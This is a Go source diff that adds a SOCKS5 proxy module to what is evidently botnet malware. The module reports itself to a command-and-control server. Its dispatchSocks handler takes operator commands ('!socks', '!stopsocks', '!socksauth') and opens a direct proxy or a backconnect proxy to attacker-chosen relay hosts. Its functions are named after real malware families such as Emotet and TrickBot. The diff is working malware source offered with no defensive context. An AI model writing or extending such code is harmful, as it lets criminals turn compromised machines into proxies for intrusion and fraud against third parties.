@@ -1,3 +1,5 @@
+//go:build withsocks
+
 package main
 
 import (
@@ -11,6 +13,9 @@ import (
 	"sync/atomic"
 	"time"
 )
+
+// hasSocks tells the bot (and CNC via REGISTER) that the SOCKS module is compiled in.
+const hasSocks = true
 
 // ============================================================================
 // BACKCONNECT SOCKS5 PROXY
@@ -452,4 +457,49 @@ func trickbot(clientConn net.Conn) {
 	}()
 	<-done
 	<-done
+}
+
+// dispatchSocks handles !socks / !stopsocks / !socksauth routed from blackEnergy.
+func dispatchSocks(conn net.Conn, cmd string, fields []string) error {
+	switch cmd {
+	case "!socks":
+		if len(fields) < 2 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !socks <port> (direct) or !socks <relay:port> (backconnect)")))
+			return nil
+		}
+		arg := fields[1]
+		if _, err := strconv.Atoi(arg); err == nil {
+			if err := turmoil(arg, conn); err != nil {
+				conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+			} else {
+				conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, "0.0.0.0:"+arg)))
+			}
+			return nil
+		}
+		var relays []string
+		for _, r := range strings.Split(arg, ",") {
+			r = strings.TrimSpace(r)
+			if r != "" {
+				relays = append(relays, r)
+			}
+		}
+		if err := muddywater(relays, conn); err != nil {
+			conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+		} else {
+			conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, relays[0])))
+		}
+	case "!stopsocks":
+		emotet()
+		conn.Write([]byte(msgSocksStop))
+	case "!socksauth":
+		if len(fields) < 3 {
+			return fmt.Errorf("usage: !socksauth <username> <password>")
+		}
+		socksCredsMutex.Lock()
+		proxyUser = fields[1]
+		proxyPass = fields[2]
+		socksCredsMutex.Unlock()
+		conn.Write([]byte(fmt.Sprintf(msgSocksAuthFmt, fields[1])))
+	}
+	return nil
 }
